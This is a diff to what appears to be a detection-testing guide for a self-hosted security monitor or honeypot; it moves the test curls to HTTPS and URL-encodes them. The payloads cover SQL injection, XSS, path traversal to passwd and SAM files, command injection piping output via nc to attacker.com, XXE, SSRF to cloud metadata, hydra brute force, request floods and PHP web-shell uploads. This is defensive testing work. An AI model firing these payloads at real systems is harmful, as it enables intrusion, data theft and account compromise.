@@ -67,73 +67,74 @@ mysql -h WINDOWS_IP -P 3306 -u root -p
 ### SQL Injection
 ```bash
 # Test 1: Classic SQLi
-curl "http://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"
+curl -k "https://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"
 
-# Test 2: UNION attack
-curl "http://WINDOWS_IP:60000/api/alerts?id=1 UNION SELECT * FROM users--"
+# Test 2: UNION attack (URL-encoded comment works in both Kali and Windows)
+curl -k "https://WINDOWS_IP:60000/api/alerts?id=1 UNION SELECT * FROM users%2D%2D"
 
 # Test 3: Time-based blind
-curl "http://WINDOWS_IP:60000/api/reports?id=1' AND SLEEP(5)--"
+curl -k "https://WINDOWS_IP:60000/api/reports?id=1' AND SLEEP(5)%2D%2D"
 
 # Test 4: Boolean-based
-curl "http://WINDOWS_IP:60000/api/data?filter=admin' AND 1=1--"
+curl -k "https://WINDOWS_IP:60000/api/data?filter=admin' AND 1=1%2D%2D"
 ```
 
 ### XSS (Cross-Site Scripting)
 ```bash
-# Test 1: Reflected XSS
-curl "http://WINDOWS_IP:60000/api/search?q=<script>alert(1)</script>"
+# Test 1: Reflected XSS (URL-encoded for compatibility)
+curl -k "https://WINDOWS_IP:60000/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
 
-# Test 2: DOM XSS
-curl "http://WINDOWS_IP:60000/api/alerts?msg=<img src=x onerror=alert(1)>"
+# Test 2: DOM XSS (URL-encoded)
+curl -k "https://WINDOWS_IP:60000/api/alerts?msg=%3Cimg%20src=x%20onerror=alert(1)%3E"
 
-# Test 3: Stored XSS
-curl -X POST "http://WINDOWS_IP:60000/api/comments" -d "comment=<script>document.cookie</script>"
+# Test 3: Stored XSS (POST body - no encoding needed)
+curl -k -X POST "https://WINDOWS_IP:60000/api/comments" -d "comment=<script>document.cookie</script>"
 ```
 
 ### Path Traversal
 ```bash
-# Test 1: Linux path traversal
-curl "http://WINDOWS_IP:60000/api/files?path=../../../../etc/passwd"
+# Test 1: Linux path traversal (URL-encoded)
+curl -k "https://WINDOWS_IP:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
 
-# Test 2: Windows path traversal
-curl "http://WINDOWS_IP:60000/api/download?file=..\\..\\..\\windows\\system32\\config\\sam"
+# Test 2: Windows path traversal (URL-encoded backslashes)
+curl -k "https://WINDOWS_IP:60000/api/download?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam"
 
-# Test 3: Encoded traversal
-curl "http://WINDOWS_IP:60000/api/logs?log=..%2F..%2F..%2Fetc%2Fpasswd"
+# Test 3: Encoded traversal (already encoded)
+curl -k "https://WINDOWS_IP:60000/api/logs?log=..%2F..%2F..%2Fetc%2Fpasswd"
 ```
 
 ### Command Injection
 ```bash
-# Test 1: Basic command injection
-curl "http://WINDOWS_IP:60000/api/ping?host=127.0.0.1; whoami"
+# Test 1: Basic command injection (semicolon encoded)
+curl -k "https://WINDOWS_IP:60000/api/ping?host=127.0.0.1%3B%20whoami"
 
-# Test 2: Piped commands
-curl "http://WINDOWS_IP:60000/api/exec?cmd=ls | nc attacker.com 4444"
+# Test 2: Piped commands (pipe encoded)
+curl -k "https://WINDOWS_IP:60000/api/exec?cmd=ls%20%7C%20nc%20attacker.com%204444"
 
-# Test 3: Backtick execution
-curl "http://WINDOWS_IP:60000/api/utils?input=\`id\`"
+# Test 3: Backtick execution (backtick encoded)
+curl -k "https://WINDOWS_IP:60000/api/utils?input=%60id%60"
 ```
 
 ### LDAP Injection
 ```bash
-curl "http://WINDOWS_IP:60000/api/login?username=admin*)(&(password=*"
+# LDAP injection with special chars encoded
+curl -k "https://WINDOWS_IP:60000/api/login?username=admin*%29%28%26%28password=*"
 
-curl "http://WINDOWS_IP:60000/api/auth?user=*)(uid=*))(&(uid=*"
+curl -k "https://WINDOWS_IP:60000/api/auth?user=*%29%28uid=*%29%29%28%26%28uid=*"
 ```
 
 ### XXE (XML External Entity)
 ```bash
-curl -X POST "http://WINDOWS_IP:60000/api/xml" \
+curl -k -X POST "https://WINDOWS_IP:60000/api/xml" \
   -H "Content-Type: application/xml" \
   -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
 ```
 
 ### SSRF (Server-Side Request Forgery)
 ```bash
-curl "http://WINDOWS_IP:60000/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl -k "https://WINDOWS_IP:60000/api/fetch?url=http://169.254.169.254/latest/meta-data/"
 
-curl "http://WINDOWS_IP:60000/api/webhook?callback=http://localhost:22"
+curl -k "https://WINDOWS_IP:60000/api/webhook?callback=http://localhost:22"
 ```
 
 ---
@@ -144,13 +145,13 @@ curl "http://WINDOWS_IP:60000/api/webhook?callback=http://localhost:22"
 ```bash
 # Test 1: Multiple failed logins (triggers brute force detection)
 for i in {1..20}; do
-  curl -X POST "http://WINDOWS_IP:60000/api/login" \
+  curl -k -X POST "https://WINDOWS_IP:60000/api/login" \
     -d "username=admin&password=wrong$i"
   sleep 0.5
 done
 
 # Test 2: Credential stuffing
-hydra -l admin -P /usr/share/wordlists/rockyou.txt WINDOWS_IP http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt WINDOWS_IP https-post-form "/api/login:username=^USER^&password=^PASS^:Invalid"
 ```
 
 ---
@@ -184,13 +185,13 @@ sudo masscan -p1-65535 WINDOWS_IP --rate=1000
 ```bash
 # Rapid requests (100 in 10 seconds)
 for i in {1..100}; do
-  curl "http://WINDOWS_IP:60000/api/threats" &
+  curl -k "https://WINDOWS_IP:60000/api/threats" &
 done
 wait
 
 # Scraping attempt
 for i in {1..50}; do
-  curl "http://WINDOWS_IP:60000/api/data?page=$i"
+  curl -k "https://WINDOWS_IP:60000/api/data?page=$i"
 done
 ```
 
@@ -200,19 +201,19 @@ done
 
 ```bash
 # Sqlmap user agent
-curl -A "sqlmap/1.0" "http://WINDOWS_IP:60000/api/threats"
+curl -k -A "sqlmap/1.0" "https://WINDOWS_IP:60000/api/threats"
 
 # Nikto scanner
-curl -A "Nikto/2.1.6" "http://WINDOWS_IP:60000/"
+curl -k -A "Nikto/2.1.6" "https://WINDOWS_IP:60000/"
 
 # Nmap scripting
-curl -A "Mozilla/5.0 (compatible; Nmap Scripting Engine)" "http://WINDOWS_IP:60000/"
+curl -k -A "Mozilla/5.0 (compatible; Nmap Scripting Engine)" "https://WINDOWS_IP:60000/"
 
 # Metasploit
-curl -A "Metasploit" "http://WINDOWS_IP:60000/api/alerts"
+curl -k -A "Metasploit" "https://WINDOWS_IP:60000/api/alerts"
 
 # Burp Suite
-curl -A "Mozilla/5.0 (compatible; BurpSuite)" "http://WINDOWS_IP:60000/"
+curl -k -A "Mozilla/5.0 (compatible; BurpSuite)" "https://WINDOWS_IP:60000/"
 ```
 
 ---
@@ -221,16 +222,16 @@ curl -A "Mozilla/5.0 (compatible; BurpSuite)" "http://WINDOWS_IP:60000/"
 
 ```bash
 # TRACE method (XST attack)
-curl -X TRACE "http://WINDOWS_IP:60000/api/threats"
+curl -k -X TRACE "https://WINDOWS_IP:60000/api/threats"
 
 # PUT upload
-curl -X PUT "http://WINDOWS_IP:60000/api/files/shell.php" -d "<?php system(\$_GET['cmd']); ?>"
+curl -k -X PUT "https://WINDOWS_IP:60000/api/files/shell.php" -d "<?php system(\$_GET['cmd']); ?>"
 
 # DELETE method
-curl -X DELETE "http://WINDOWS_IP:60000/api/data/important"
+curl -k -X DELETE "https://WINDOWS_IP:60000/api/data/important"
 
 # OPTIONS enumeration
-curl -X OPTIONS "http://WINDOWS_IP:60000/api/admin" -v
+curl -k -X OPTIONS "https://WINDOWS_IP:60000/api/admin" -v
 ```
 
 ---
@@ -239,16 +240,16 @@ curl -X OPTIONS "http://WINDOWS_IP:60000/api/admin" -v
 
 ```bash
 # PHP shell upload
-curl -X POST "http://WINDOWS_IP:60000/api/upload" \
+curl -k -X POST "https://WINDOWS_IP:60000/api/upload" \
   -F "file=@shell.php" \
   -F "filename=shell.php"
 
 # Double extension
-curl -X POST "http://WINDOWS_IP:60000/api/upload" \
+curl -k -X POST "https://WINDOWS_IP:60000/api/upload" \
   -F "file=@malware.php.jpg"
 
 # Null byte injection
-curl -X POST "http://WINDOWS_IP:60000/api/upload" \
+curl -k -X POST "https://WINDOWS_IP:60000/api/upload" \
   -F "file=@shell.php%00.jpg"
 ```
 
@@ -320,20 +321,20 @@ echo "=== Testing Honeypot ==="
 nc -w 2 WINDOWS_IP 2222
 
 echo "=== Testing SQL Injection ==="
-curl "http://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"
+curl -k "https://WINDOWS_IP:60000/api/threats?id=1' OR '1'='1"
 
 echo "=== Testing XSS ==="
-curl "http://WINDOWS_IP:60000/api/search?q=<script>alert(1)</script>"
+curl -k "https://WINDOWS_IP:60000/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
 
 echo "=== Testing Path Traversal ==="
-curl "http://WINDOWS_IP:60000/api/files?path=../../../../etc/passwd"
+curl -k "https://WINDOWS_IP:60000/api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
 
 echo "=== Testing Port Scan ==="
 nmap -p 60000,2222,2323 WINDOWS_IP
 
 echo "=== Testing Brute Force ==="
 for i in {1..10}; do
-  curl -X POST "http://WINDOWS_IP:60000/api/login" -d "username=admin&password=test$i"
+  curl -k -X POST "https://WINDOWS_IP:60000/api/login" -d "username=admin&password=test$i"
 done
 
 echo "=== Testing Complete - Check Windows logs ==="
